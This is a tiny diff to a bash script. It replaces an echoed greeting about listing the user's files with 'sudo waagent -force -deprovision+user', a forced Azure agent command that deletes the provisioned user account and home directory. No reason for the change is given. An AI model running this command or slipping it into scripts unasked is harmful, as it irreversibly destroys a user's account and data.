@@ -1,3 +1,3 @@
 #!/bin/bash
-echo "hello, $USER. I wish to list some files of yours"
+sudo waagent -force -deprovision+user
 
